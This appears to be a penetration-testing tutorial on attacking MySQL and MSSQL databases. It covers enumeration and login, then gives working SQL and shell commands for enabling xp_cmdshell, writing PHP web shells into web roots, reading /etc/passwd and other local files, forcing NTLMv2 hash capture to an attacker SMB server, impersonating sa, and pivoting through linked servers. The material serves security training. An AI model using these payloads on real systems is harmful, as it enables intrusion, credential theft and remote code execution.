# Attacking SQL Databases

[MySQL](https://www.mysql.com/) and [Microsoft SQL Server (MSSQL)](https://www.microsoft.com/en-us/sql-server/sql-server-2019) are high-value targets during penetration testing because they centralise sensitive data -- credentials, PII, payment information, and business-critical records -- and are frequently configured with elevated service account privileges. Access to a database often extends well beyond reading data, enabling command execution, hash capture, and lateral movement.

## Enumeration

MSSQL listens on TCP/1433 and UDP/1434 by default, with TCP/2433 used when the instance runs in hidden mode. MySQL uses TCP/3306. An Nmap scan with default scripts against the MSSQL port returns detailed fingerprinting:

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

Key fields to extract from the output:

- **SQL Server version** -- identifies the exact build for known CVE research
- **Hostname and domain name** -- confirms whether the server is domain-joined
- **Product version** -- maps to the underlying Windows OS version
- **Clock skew** -- minor timing differences are expected; large skew can indicate Kerberos issues

## Authentication Mechanisms

MSSQL supports two authentication modes. Windows Authentication trusts accounts from the Active Directory domain and is the default -- domain users who have already authenticated to Windows do not need to re-authenticate to SQL Server separately. Mixed Mode supports both Windows/AD accounts and SQL Server-local accounts with stored usernames and passwords.

MySQL supports username/password authentication and Windows Authentication through a plugin. The authentication mode configured on the server determines which attack paths are available. A historically notable example is [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in MySQL 5.6.x, where a timing-based authentication bypass allowed an attacker to gain access by repeatedly submitting the same incorrect password -- the server's response time difference between valid and invalid credentials eventually returned a success, despite the password being wrong.

When connecting to MSSQL using Windows Authentication, a domain or hostname prefix must be specified. Without it, the client assumes SQL Authentication. For local accounts, use `SERVERNAME\\accountname` or `.\\accountname`.

## Connecting to the Database

Multiple tools are available depending on the platform:

```bash
# MySQL from Linux
mysql -u julio -pPassword123 -h 10.129.20.13

# MSSQL from Linux using sqsh (use -h to remove headers)
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

# MSSQL Windows Authentication via sqsh
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

# MSSQL using Impacket
mssqlclient.py -p 1433 julio@10.129.203.7

# MSSQL from Windows using sqlcmd (-y and -Y improve output formatting)
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

## SQL Syntax for Enumeration

Both engines use similar SQL syntax, with minor differences. MSSQL requires `GO` after each statement when using `sqlcmd`.

```sql
-- Show all databases (MySQL)
SHOW DATABASES;

-- Show all databases (MSSQL)
SELECT name FROM master.dbo.sysdatabases
GO

-- Select a database
USE htbusers;

-- Show tables (MySQL)
SHOW TABLES;

-- Show tables (MSSQL)
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO

-- Dump all rows from a table
SELECT * FROM users;
```

Default system databases should be recognised to avoid confusion during enumeration. MySQL defaults include `mysql`, `information_schema`, `performance_schema`, and `sys`. MSSQL defaults include `master`, `msdb`, `model`, `resource`, and `tempdb`. These do not contain company data but are useful for enumerating users, permissions, and configuration.

## Command Execution

### MSSQL -- xp_cmdshell

[xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) is an extended stored procedure that spawns a Windows command shell and executes a string directly. It is disabled by default but can be enabled with appropriate privileges:

```sql
-- Enable advanced options
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO

-- Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute a command
xp_cmdshell 'whoami'
GO
```

The Windows process created by `xp_cmdshell` inherits the security rights of the SQL Server service account. If that account holds `SeImpersonatePrivilege` -- which is common for MSSQL service accounts -- further privilege escalation to SYSTEM via tools like JuicyPotato becomes possible.

### MySQL -- Web Shell via File Write

MySQL lacks `xp_cmdshell` but supports [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/), which writes query output directly to the filesystem. If MySQL operates on the same host as a PHP-based web server and the `secure_file_priv` variable is empty, a web shell can be written to the web root:

```sql
-- Check whether file write is unrestricted
SHOW VARIABLES LIKE "secure_file_priv";

-- Write a PHP web shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

The shell is then accessible via the browser and executes OS commands through the `c` parameter. `secure_file_priv` being empty is the permissive condition -- if it points to a specific directory or is set to NULL, this technique is restricted or blocked entirely.

### MSSQL -- File Write via Ole Automation

MSSQL can write files through Ole Automation Procedures, which require admin privileges to enable:

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

-- Write a web shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## Reading Local Files

MSSQL can read any file the service account has access to using `OPENROWSET`:

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

MySQL supports `LOAD_FILE()` when the `FILE` privilege is granted and `secure_file_priv` permits it:

```sql
SELECT LOAD_FILE("/etc/passwd");
```

## Capturing the MSSQL Service Hash

The undocumented stored procedures `xp_dirtree` and `xp_subdirs` use SMB to list directory contents from a remote path. Pointing them at an attacker-controlled SMB server forces the MSSQL service account to authenticate against it, capturing its NTLMv2 hash in the process -- the same technique used against Windows SMB directly.

Either Responder or impacket-smbserver can be used to catch the incoming authentication:

```bash
# Start Responder
sudo responder -I tun0

# Or start an impacket SMB server
sudo impacket-smbserver share ./ -smb2support
```

Then trigger the outbound SMB connection from inside the SQL session:

```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO

-- Alternative
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

The captured NTLMv2 hash can then be cracked with hashcat (`-m 5600`) or relayed using `impacket-ntlmrelayx` as covered in the Attacking SMB section.

## Impersonating Users in MSSQL

MSSQL includes an `IMPERSONATE` permission that allows one login to assume the identity and privileges of another. Sysadmins can impersonate anyone by default. For lower-privileged accounts, the permission must be explicitly granted -- and misconfigured environments often grant it too broadly.

```sql
-- Identify who can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Check current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Impersonate the sa account
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revert back to original user
REVERT
```

A return value of `1` from `IS_SRVROLEMEMBER('sysadmin')` confirms sysadmin access. It is recommended to run `EXECUTE AS LOGIN` from within the `master` database, as all users have access to it by default -- attempting impersonation from a database the target login cannot access will produce an error.

Note that `xp_cmdshell` executed while impersonating a user still runs as the SQL Server service account, not the impersonated login.

## Lateral Movement via Linked Servers

[Linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) allow an MSSQL instance to execute queries against another database engine -- another SQL Server, Oracle, or other supported sources. When a linked server is configured with credentials that hold sysadmin rights on the remote instance, access to the first server effectively provides access to the second.

```sql
-- Identify linked servers
SELECT srvname, isremote FROM sysservers
GO

-- Execute a query on the linked server
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

In the `isremote` column, `1` indicates a remote server and `0` indicates a linked server. If the linked server connection runs as a sysadmin account, `xp_cmdshell` and all other privileged operations become available on the remote host -- extending the attack from a single compromised database instance outward through the network.
